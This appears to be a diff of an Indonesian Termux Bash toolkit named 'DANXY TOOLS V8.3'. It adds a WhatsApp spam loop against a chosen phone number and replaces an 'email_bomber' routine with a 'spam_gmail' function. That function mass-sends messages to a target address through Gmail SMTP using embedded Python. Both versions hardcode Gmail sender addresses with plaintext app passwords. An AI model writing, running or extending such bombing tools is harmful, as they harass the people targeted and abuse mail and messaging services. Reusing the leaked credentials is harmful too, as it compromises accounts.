+    printf "   ${GREEN}┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} S.OTP ${YELLOW}${RED}]${NC}${GREEN}\n   ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+           read -r nomor
+  [[ $nomor == [Qq] || -z $nomor ]] && break
+  [[ ! $nomor =~ ^62[0-9]+$ ]] && { echo -e "${YELLOW}Nomor harus dimulai dengan 62 dan hanya angka.${NC}"; continue; }
+
+  while true; do
+    read -t 0.2 -n 1 key && [[ $key == [Qq] || $key == "" ]] && break 2
+    spam_whatsapp "$nomor"
+    sleep 2
+  done
+done
+}
 generate_password() {
     read -p "Masukkan panjang password yang diinginkan: " length
 
@@ -2056,7 +2222,7 @@ clear
         track_live
         ;;
         3)
-         email_bomber
+         spam_gmail
         ;;
         4)
          Nik_cek
@@ -3060,48 +3226,83 @@ echo "                                                          "
 python3 Danxy.py
 }
 
+garis()        { echo '┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓'; }
+garis_tutup()  { echo '┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛'; }
+garis_tengah() { echo '┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫'; }
+   
+ATAS()        { echo '┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓'; }
+BAWAH()  { echo '┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛'; }
+#!/usr/bin/env bash
+spam_gmail() {
+echo 
+clear
+ATAS
+BAWAH
+echo -e "${WHITE}
+⠀⠀⠀⠀⠀⠀⠀⢀⡤⠒⠉⠉⠉⠒⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠰⠋⠀⢀⣀⣀⡠⠆⠀⢱⠀⠀⠀⠀⠀⠀⠀⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢆⣀⢀⠇⢠⣤⠀⠀⡤⠀⡆⠀⠀⠀⠀⠀⠀⡇⠀⠀⣠⣀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡅⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⢶⣻⡽⣧⢿⣹⡷⣤⣀⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠛⠘⠃⠀⠀${GREEN}⣧${NC}⠀⡄${GREEN}⣧${NC}⠀⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⣿⢿⡧⣄⠀⢀⡼⡇⠀⡇⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿⡼⣟⣧⢿⣻⡼⡧⠻⣿⣻⡇⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠢⢄⠀⠀⠀⠁⢠⡼⠀⠀⠇⠀⠀⠀⠀⠀⡠⡇⠀⠀⡆⢻⠷⢹⢏⡷⠝⠣⢋⡆⠀⠀⠦⡀⠀⠀⠀⠀⠀⠀⠀⢺⣽⣻⠾⡽⢾⠙⢡⣾⣳⢯⠃⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠰⠒⠢⠀⡸⠁⠀⠀⠀⣴⠋⠀⡇⠀⠀⡇⣹⠀⠀⠉⠀⠀⢆⣨⡇⠀⠀⠄⠈⢒⡄⠀⠀⠀⠀⠀⠨⡷⣯⢦⡈⢋⡴⣟⡾⣭⡟⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣀⡠⡎⠀⠈⠓⠠⢤⡤⠒⠁⠀⠀⠀⠀⡇⠁⠢⢇⠀⠀⠀⠉⠀⠀⠀⠀⠀⠈⠈⠀⠀⢀⠦⠚⠁⡇⠀⠀⠀⠀⠀⠀⠙⢽⣯⣻⣽⢻⣭⢿⡭⠄⠴⠠⡀⠀⠀
+⠀⠀⡠⠒⠉⠀⠀⠙⢄⡀⠀⠀⡸⠈⠉⠂⠄⡀⠀⠀⡇⠀⠀⠀⠑⠢⢀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠈⠘⢷⣫⠿⠚⠋⠀⠀⡀⠰⠅⠀⠀
+⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠉⣦⠀⡇⠀⠀⠀⠀⠀⠀⠁⠢⡀⠀⠀⡠⠔⠁⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠔⠚⠀⣀⠃⠀⠀⠀⠘⡄⠈⠈⡆
+⡌⠀⠀⠀⠀⠀${RED}⢠⡶⣖⢶⣲⢖⡶⣲⢦${NC}⠀⠀⠀⠈⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠘⣷⣄⠓⣄⠀⢣⠀⠀⠀⠀⢀⠆⢀⡏⠀
+⡇⠀⠀⠀⠀⠀${RED}⢸⡳⣝⣮⢳⣏⠾⣵⢫⢷⠶⡶⢶⠶⡶⢶⡶⢶⡶⡄${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣟⢿⡻⣟⢿⣻⢟⡿⣽⡞⣷⣜⠀⠀⠑⠠⠤⠔⠊⢀⡈⡽⠀
+⠀⠀⠀⠀⠀⠀${RED}⢸⡳⣟⡞⡷⣞⡻⣞⡻⣞⡻⣽⢫⡟⣽⢳⣛⢷⣛⠷⣴⣢${NC}⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠄⢼⢯⣻⣽⢫⣟⡾⣏⡿⢧⣟⡷⡫⠃⠐⣂⠀⢀⠀⣰⠋⠉⠀⠀
+⠀⠀⠀⠀⠀⠀${RED}⢸⣳⢯⣝⡳⣭⣳⢭⠷⡭⠃⠋⢷⡝⣮⢻⡜⣧⢏⡟⡶⡏${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠈⠁⠉⢙⡿⡾⠉⠀⠀⠀⠈⠉⠁⠉⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀${RED}⢰⣻⣝⢮⡽⢶⡹⢮⡛⠀⣤⡄⠈⢻⣜⢧⡟⣮⢻⣼⣹⠃${NC}⠀⠀⠀⠀⠀⠀⠀⠈⠱⣄⠀⠀⠀⠀⢀⠔⠒⠒⢤⡘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀${RED}⠰⣟⡼⣣⢟⣧⢻⠝⠁⠀⣿⡇⠀⠀⢛⣮⡝⣞⢯⡗⣿⠈${NC}⠀⠉⠀⠈⠉⠀⠉⠀⢀⠟⠁⠀⣀⠰⠃⠀⠀⠀⠀⢧⠔⠒⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀${RED}⢸⡏⣷⡝⣾⡜⠋⠀⠀⠀⣤⡄⠀⠀⠀⢱⢻⣼⢣⡟⡇⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠀⡎⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣭⣦⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀${RED}⢸⡽⣖⢯⡳⡽⣄⢀⡀⣀⢈⡀⣀⢀⡀⣠⢟⡼⣫⢞⠃⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⠒⠀⠀⠀⠀⠀⠿⣜⡳⣞⢶⠓⠺⣜⡳⣎⠷⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀${RED}⠘⠷⠹⠎⠷⠝⠮⠻⠜⠧⠏⠷⠭⠳⠝⠧⠻⠜⠳⠟⠀⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⢀⡟⣧⢻⡼⢁⢾⣁⠺⣵⢫⡟⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡜⡯⢀⣞⣧⢯⢧⡘⢧⣛⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⣼⢣⣈⣌⣈⣉⣌⡡⣜⢧⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
+" | lolcat
+garis | lolcat
+echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.3${BG_RED}                ${NC}┃" 
+garis_tutup | lolcat
+garis | lolcat
+echo -n "┃ 1. GMAIL TARGET: "; read -r target
+garis_tengah | lolcat
+echo -n "┃ 2. PESAN: ";        read -r pesan
+garis_tengah | lolcat
+echo -n "┃ 3. JUMLAH SPAM: ";  read -r jumlah
+garis_tengah | lolcat
+echo -n "┃ 4. JEDA DELAY [1/5]: "; read -r delay
+garis_tutup | lolcat
+garis | lolcat
+echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.3${BG_RED}                ${NC}┃" 
+garis_tutup | lolcat
 
-email_bomber() {
-    clear
-    color cyan "=== EMAIL BOMBER AUTO-FILL (Termux-safe) ==="
-    read -p "Email target : " target
-    read -p "Pesan / body : " pesan
-    read -p "Jumlah kirim : " jumlah
-    [[ ! $target =~ @ ]] && { color red "Format email salah!"; return; }
-    [[ ! $jumlah =~ ^[0-9]+$ ]] && { color red "Jumlah harus angka!"; return; }
+: "${jumlah:=1}"
+: "${delay:=1}"
 
-    sender="danxytools8.3@gmail.com"
-    pass="uhvliawgqwpuzqiu"
+    echo -e "\nconfirmasi pengiriman [Y/N]: \c"
+    read -n1 confirm
+    [[ $confirm != [Yy] ]] && { echo -e "\nDibatalkan."; return; }
 
-    host="smtp.gmail.com"
-    port=465
-
-    color green "Mulai kirim..."
-    for ((i=1;i<=jumlah;i++)); do
-        {
-            # Start TLS
-            openssl s_client -connect "$host:$port" -quiet -crlf <<EOF
-EHLO bomber
-AUTH LOGIN
-$(printf '%s' "$sender" | base64)
-$(printf '%s' "$pass" | base64)
-MAIL FROM:<$sender>
-RCPT TO:<$target>
-DATA
-From: $sender
-To: $target
-Subject: Spam #$i
-
-$pesan
-.
-QUIT
-EOF
-        } 2>/dev/null
-        color green "Email ke-$i terkirim → $target"
-        sleep 2
-    done
-    color yellow "Selesai!"
+    python3 - "$target" "$pesan" "$jumlah" "$delay" <<'PY'
+import smtplib, sys, time
+t, msg, n, d = sys.argv[1:5]
+sender = "jankonjan752@gmail.com"
+pwd    = "lsxudjxubunaeaku"
+for i in range(1, int(n)+1):
+    m = smtplib.SMTP("smtp.gmail.com", 587)
+    m.starttls()
+    m.login(sender, pwd)
+    body = f"From: {sender}\r\nTo: {t}\r\nSubject: DANXY TOOLS V8.3 #{i}\r\n\r\n{msg}"
+    m.sendmail(sender, t, body)
+    m.quit()
+    print(f"[✓] terkirim #{i}")
+    if i < int(n):
+        time.sleep(float(d))
+PY
 }
+
+
 
 #show_whatsapp_support
 main_menu
